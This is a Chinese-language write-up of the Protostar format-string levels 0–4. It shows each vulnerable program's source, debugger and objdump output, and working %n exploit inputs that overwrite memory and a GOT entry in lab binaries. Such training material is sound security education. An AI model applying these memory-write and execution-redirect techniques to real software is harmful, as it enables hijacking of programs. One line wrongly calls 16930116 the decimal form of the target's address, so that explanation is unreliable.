# Format

## Format

### About

This level introduces format strings, and how attacker supplied format strings can modify the execution flow of programs.

**Hints**

* This level should be done in less than 10 bytes of input.
* “Exploiting format string vulnerabilities”

This level is at /opt/protostar/bin/format0

### Source code

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void vuln(char *string)
{
  volatile int target;
  char buffer[64];

  target = 0;

  sprintf(buffer, string);

  if(target == 0xdeadbeef) {
      printf("you have hit the target correctly :)\n");
  }
}

int main(int argc, char **argv)
{
  vuln(argv[1]);
}
```

`sprintf`指的是**字符串格式化命令**，主要功能是**把格式化的数据写入某个字符串中**。`sprintf` 是个[变参](https://baike.baidu.com/item/变参/9844833)函数。使用`sprintf` 对于写入`buffer`的字符数是**没有限制**的，这就存在了`buffer`溢出的可能性。

用objdump查看一下汇编代码，`target`变量在`ebp-0xc`处，`buffer`在`ebp-0x4c`处，二者相距`0x40`（64个字节），所以通过格式化字符串，**写入64个字符（从栈中格式化字符串的后面取值），后面跟上0xdeadbeef**，就能将`target`的值覆盖成`0xdeadbeef`。

```javascript
080483f4 <vuln>:
 80483f4:    55                       push   ebp
 80483f5:    89 e5                    mov    ebp,esp
 80483f7:    83 ec 68                 sub    esp,0x68
 80483fa:    c7 45 f4 00 00 00 00     mov    DWORD PTR [ebp-0xc],0x0
 8048401:    8b 45 08                 mov    eax,DWORD PTR [ebp+0x8]
 8048404:    89 44 24 04              mov    DWORD PTR [esp+0x4],eax
 8048408:    8d 45 b4                 lea    eax,[ebp-0x4c]
 804840b:    89 04 24                 mov    DWORD PTR [esp],eax
 804840e:    e8 ed fe ff ff           call   8048300 <sprintf@plt>
 8048413:    8b 45 f4                 mov    eax,DWORD PTR [ebp-0xc]
 8048416:    3d ef be ad de           cmp    eax,0xdeadbeef
 804841b:    75 0c                    jne    8048429 <vuln+0x35>
 804841d:    c7 04 24 10 85 04 08     mov    DWORD PTR [esp],0x8048510
 8048424:    e8 07 ff ff ff           call   8048330 <puts@plt>
 8048429:    c9                       leave
 804842a:    c3                       ret
```

你可以写入`64个A`或者其他的，或者可以通过`%64c`写入64个字符，后面在加上`deadbeef`。**$\(\)**是用来做**命令替换**的，先执行`$()`里面的命令，得到返回结果进行替换。

### Exp

```bash
user@protostar:/opt/protostar/bin$ ./format0 $(echo -en "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xef\xbe\xad\xde")
you have hit the target correctly :)

user@protostar:/opt/protostar/bin$ ./format0 $(echo -en "%64c\xef\xbe\xad\xde")
you have hit the target correctly :)
```

## Format1

### About

This level shows how format strings can be used to modify arbitrary memory locations.

**Hints**

* objdump -t is your friend, and your input string lies far up the stack :\)

This level is at /opt/protostar/bin/format1

### Source code

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int target;

void vuln(char *string)
{
  printf(string);

  if(target) {
      printf("you have modified the target :)\n");
  }
}

int main(int argc, char **argv)
{
  vuln(argv[1]);
}
```

解决方案如下：我们确定目标变量的地址。我们以格式字符串传递此地址。格式字符串实际上是一个参数，将保存在堆栈中。然后，我们确定地址在堆栈中的位置，并使用`％k\$n`\(应该是%k$n的形式，但是由于输出的时候可以被转义，所以加上一个"\"\)，其中k是数字。

首先通过`objdump`查看符号表，可以看到target的地址是`0x8049638`，处于`bss段`。

```text
$ objdump -t format1
080483f4 g     F .text    00000028              vuln
08049638 g     O .bss    00000004              target
0804963c g       *ABS*    00000000              _end
00000000       F *UND*    00000000              puts@@GLIBC_2.0
08049630 g       *ABS*    00000000              _edata
080484aa g     F .text    00000000              .hidden __i686.get_pc_thunk.bx
0804841c g     F .text    0000001b              main
080482c0 g     F .init    00000000              _init
```

我们通过%p（以地址形式显示）打印栈中的内容。我们在后面发现了有`0x41414141`，`0x41`就是'`A`'的ascii值。

```text
$ user@protostar:/opt/protostar/bin$ ./format1 $(python -c "print('AAAAAAAA' + '%p-' * 150)")
AAAAAAAA0x804960c-0xbffff5d8-0x8048469-0xb7fd8304-0xb7fd7ff4-0xbffff5d8-0x8048435-0xbffff7b7-0xb7ff1040-0x804845b-0xb7fd7ff4-0x8048450-(nil)-0xbffff658-0xb7eadc76-0x2-0xbffff684-0xbffff690-0xb7fe1848-0xbffff640-0xffffffff-0xb7ffeff4-0x804824d-0x1-0xbffff640-0xb7ff0626-0xb7fffab0-0xb7fe1b28-0xb7fd7ff4-(nil)-(nil)-0xbffff658-0x90bcfb24-0xbaef4d34-(nil)-(nil)-(nil)-0x2-0x8048340-(nil)-0xb7ff6210-0xb7eadb9b-0xb7ffeff4-0x2-0x8048340-(nil)-0x8048361-0x804841c-0x2-0xbffff684-0x8048450-0x8048440-0xb7ff1040-0xbffff67c-0xb7fff8f8-0x2-0xbffff7ad-0xbffff7b7-(nil)-0xbffff982-0xbffff990-0xbffff9a4-0xbffff9c6-0xbffff9d9-0xbffff9e3-0xbffffed3-0xbfffff11-0xbfffff25-0xbfffff3c-0xbfffff4d-0xbfffff55-0xbfffff65-0xbfffff80-0xbfffff8d-0xbfffffc1-0xbfffffd4-0xbfffffe0-(nil)-0x20-0xb7fe2414-0x21-0xb7fe2000-0x10-0x178bfbbf-0x6-0x1000-0x11-0x64-0x3-0x8048034-0x4-0x20-0x5-0x7-0x7-0xb7fe3000-0x8-(nil)-0x9-0x8048340-0xb-0x3e9-0xc-(nil)-0xd-0x3e9-0xe-0x3e9-0x17-0x1-0x19-0xbffff78b-0x1f-0xbffffff2-0xf-0xbffff79b-(nil)-(nil)-(nil)-(nil)-(nil)-0x80000000-0x9dc2ee44-0x412db7ab-0xbe1a1728-0x694ebebc-0x363836-(nil)-(nil)-(nil)-0x662f2e00-0x616d726f-0x41003174-0x41414141-0x25414141-0x70252d70-0x2d70252d-0x252d7025-0x70252d70-0x2d70252d-0x252d7025-0x70252d70-0x2d70252d-0x252d7025-0x70252d70-0x2d70252d-0x252d7025-0x70252d70-0x2d70252d-0x252d7025-
```

通过多次尝试，我们找的了`BBBB`的对应位置，我们需要在`BBBB`填入`target的地址`，然后用`%n`将改地址写入内容。

`%k$x`表示要泄漏偏移k处4字节长的16进制数据，比如我输入`AAAA%3$08x`,就可以得到位于`format参数`下面第三个数据。

### Exp

```text
user@protostar:/opt/protostar/bin$ ./format1 $(python -c "print('ABBBBCCC' + '%133\$p')")
ABBBBCCC0x42424242

user@protostar:/opt/protostar/bin$ ./format1 $(python -c "print('ABBBBCCC' + '%133\$p')")
ABBBBCCC0x42424242user@protostar:/opt/protostar/bin$ ./format1 $(python -c "print('A\x38\x96\x04\x08CCC' + '%133\$p')")
A8CCC0x8049638

user@protostar:/opt/protostar/bin$ ./format1 $(python -c "print('A\x38\x96\x04\x08CCC' + '%133\$n')")
A8CCCyou have modified the target :)
```

## Format2

### About

This level moves on from [format1](http://exploit-exercises.lains.space/protostar/format1) and shows how specific values can be written in memory.

This level is at /opt/protostar/bin/format2

### Source code

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int target;

void vuln()
{
  char buffer[512];

  fgets(buffer, sizeof(buffer), stdin);
  printf(buffer);

  if(target == 64) {
      printf("you have modified the target :)\n");
  } else {
      printf("target is %d :(\n", target);
  }
}

int main(int argc, char **argv)
{
  vuln();
}
```

首先通过`AAAA`找偏移，可以看到在格式化字符串后面4个位置。

```text
$ user@protostar:/opt/protostar/bin$ python -c "print('AAAA' + '%p ' * 10 )" | ./format2
AAAA0x200 0xb7fd8420 0xbffff5e4 0x41414141 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520
target is 0 :(
```

然后通过`objdump -t format2` 查看符号表，找到target地址。

```text
00000000       F *UND*    00000000              printf@@GLIBC_2.0
080496d8 g       *ABS*    00000000              __bss_start
08048454 g     F .text    00000067              vuln
080496d8 g     O .bss    00000004              stdin@@GLIBC_2.0
080496e4 g     O .bss    00000004              target
080496e8 g       *ABS*    00000000              _end
00000000       F *UND*    00000000              puts@@GLIBC_2.0
080496d8 g       *ABS*    00000000              _edata
0804853a g     F .text    00000000              .hidden __i686.get_pc_thunk.bx
080484bb g     F .text    0000000f              main
0804830c g     F .init    00000000              _init
```

通过`%64c`打印64个字符，再通过`%n`将**打印成功的字数**写入到相应的地址中，`'%64c' + '%6\$n' + '\xe4\x96\x04\x08'` 中，`%64c`在偏移4处，刚才通过`AAAA`找到的，然后`%6$n`在偏移5处，最后`target的地址`在偏移6处。`%6$n`表示在偏移6处的地址写入数据。

### Exp

```text
user@protostar:/opt/protostar/bin$ python -c "print('%64c' + '%6\$n' + '\xe4\x96\x04\x08')" | ./format2
                                                               �
you have modified the target :)
```

## Format3

### About

This level advances from [format2](http://exploit-exercises.lains.space/protostar/format2) and shows how to write more than 1 or 2 bytes of memory to the process. This also teaches you to carefully control what data is being written to the process memory.

This level is at /opt/protostar/bin/format3

### Source code

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int target;

void printbuffer(char *string)
{
  printf(string);
}

void vuln()
{
  char buffer[512];

  fgets(buffer, sizeof(buffer), stdin);

  printbuffer(buffer);

  if(target == 0x01025544) {
      printf("you have modified the target :)\n");
  } else {
      printf("target is %08x :(\n", target);
  }
}

int main(int argc, char **argv)
{
  vuln();
}
```

还是先找到偏移，**偏移为12**。

```text
$ user@protostar:/opt/protostar/bin$ python -c "print('AAAA' + '%p ' * 20)" | ./format3
AAAA(nil) 0xbffff5a0 0xb7fd7ff4 (nil) (nil) 0xbffff7a8 0x804849d 0xbffff5a0 0x200 0xb7fd8420 0xbffff5e4 0x41414141 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070
target is 00000000 :(

user@protostar:/opt/protostar/bin$ python -c "print('AAAA' + '%12\$p')" | ./format3
AAAA0x41414141
target is 00000000 :(
```

找到target地址， 0x080496f4，十进制是 16930116，构造payload。

```text
080496e8 g       *ABS*    00000000              __bss_start
08048467 g     F .text    00000069              vuln
080496e8 g     O .bss    00000004              stdin@@GLIBC_2.0
080496f4 g     O .bss    00000004              target
080496f8 g       *ABS*    00000000              _end
00000000       F *UND*    00000000              puts@@GLIBC_2.0
080496e8 g       *ABS*    00000000              _edata
0804854a g     F .text    00000000              .hidden __i686.get_pc_thunk.bx
080484d0 g     F .text    0000000f              main
0804830c g     F .init    00000000              _init
```

### exp

```text
user@protostar:/opt/protostar/bin$ python -c "print('%16930116c%16\$na\xf4\x96\x04\x08')" | ./format3
```

注意对齐，%169 3011 6c%1 6$na \xf4\x96\x04\x08 ，%169偏移是12， 3011偏移13， 6c%1 偏移14， 6$n偏移15，但是只有三个字符，需要补充一个字节，\xf4\x96\x04\x08的偏移才是16。

## format4

### About

format4 looks at one method of redirecting execution in a process.

**Hints:** objdump -TR is your friend

This level is at /opt/protostar/bin/format4

### Source code

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int target;

void hello()
{
  printf("code execution redirected! you win\n");
  _exit(1);
}

void vuln()
{
  char buffer[512];

  fgets(buffer, sizeof(buffer), stdin);

  printf(buffer);

  exit(1);  
}

int main(int argc, char **argv)
{
  vuln();
}
```

这道题应该是让我们去**修改程序流程**，执行`hello`这个函数,根据提示，查看动态符号表。

```text
user@protostar:/opt/protostar/bin$ objdump -TR format4

format4:     file format elf32-i386

DYNAMIC SYMBOL TABLE:
00000000  w   D  *UND*    00000000              __gmon_start__
00000000      DF *UND*    00000000  GLIBC_2.0   fgets
00000000      DF *UND*    00000000  GLIBC_2.0   __libc_start_main
00000000      DF *UND*    00000000  GLIBC_2.0   _exit
00000000      DF *UND*    00000000  GLIBC_2.0   printf
00000000      DF *UND*    00000000  GLIBC_2.0   puts
00000000      DF *UND*    00000000  GLIBC_2.0   exit
080485ec g    DO .rodata    00000004  Base        _IO_stdin_used
08049730 g    DO .bss    00000004  GLIBC_2.0   stdin


DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE
080496fc R_386_GLOB_DAT    __gmon_start__
08049730 R_386_COPY        stdin
0804970c R_386_JUMP_SLOT   __gmon_start__
08049710 R_386_JUMP_SLOT   fgets
08049714 R_386_JUMP_SLOT   __libc_start_main
08049718 R_386_JUMP_SLOT   _exit
0804971c R_386_JUMP_SLOT   printf
08049720 R_386_JUMP_SLOT   puts
08049724 R_386_JUMP_SLOT   exit
```

printf后面有一个exit的函数，

```text
(gdb) disass vuln
Dump of assembler code for function vuln:
0x080484d2 <vuln+0>:    push   ebp
0x080484d3 <vuln+1>:    mov    ebp,esp
0x080484d5 <vuln+3>:    sub    esp,0x218
0x080484db <vuln+9>:    mov    eax,ds:0x8049730
0x080484e0 <vuln+14>:    mov    DWORD PTR [esp+0x8],eax
0x080484e4 <vuln+18>:    mov    DWORD PTR [esp+0x4],0x200
0x080484ec <vuln+26>:    lea    eax,[ebp-0x208]
0x080484f2 <vuln+32>:    mov    DWORD PTR [esp],eax
0x080484f5 <vuln+35>:    call   0x804839c <fgets@plt>
0x080484fa <vuln+40>:    lea    eax,[ebp-0x208]
0x08048500 <vuln+46>:    mov    DWORD PTR [esp],eax
0x08048503 <vuln+49>:    call   0x80483cc <printf@plt>
0x08048508 <vuln+54>:    mov    DWORD PTR [esp],0x1
0x0804850f <vuln+61>:    call   0x80483ec <exit@plt>
End of assembler dump.

(gdb) b *0x804850f
Breakpoint 1 at 0x804850f: file format4/format4.c, line 22.

(gdb) disass 0x80483ec
Dump of assembler code for function exit@plt:
0x080483ec <exit@plt+0>:    jmp    DWORD PTR ds:0x8049724
0x080483f2 <exit@plt+6>:    push   0x30
0x080483f7 <exit@plt+11>:    jmp    0x804837c
End of assembler dump.

(gdb) x 0x8049724
0x8049724 <_GLOBAL_OFFSET_TABLE_+36>:    0x080483f2

(gdb) r
Starting program: /opt/protostar/bin/format4
AAAA
AAAA

Breakpoint 1, 0x0804850f in vuln () at format4/format4.c:22
22    format4/format4.c: No such file or directory.
    in format4/format4.c

(gdb) disass hello
Dump of assembler code for function hello:
0x080484b4 <hello+0>:    push   ebp
0x080484b5 <hello+1>:    mov    ebp,esp
0x080484b7 <hello+3>:    sub    esp,0x18
0x080484ba <hello+6>:    mov    DWORD PTR [esp],0x80485f0
0x080484c1 <hello+13>:    call   0x80483dc <puts@plt>
0x080484c6 <hello+18>:    mov    DWORD PTR [esp],0x1
0x080484cd <hello+25>:    call   0x80483bc <_exit@plt>
End of assembler dump.

(gdb) x 0x8049724
0x8049724 <_GLOBAL_OFFSET_TABLE_+36>:    0x080484b4
(gdb) c
Continuing.
code execution redirected! you win

Program exited with code 01.
```

```text
user@protostar:/opt/protostar/bin$ python -c "print('AAAA' + '%p '*20)" | ./format4
AAAA0x200 0xb7fd8420 0xbffff5e4 0x41414141 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0xa

user@protostar:/opt/protostar/bin$ python -c "print('AAAA' + '%4\$p')" | ./format4
AAAA0x41414141

user@protostar:/opt/protostar/bin$ python -c "print('%134513844c%8\$na$\x97\x04\x08')" | ./format4
```

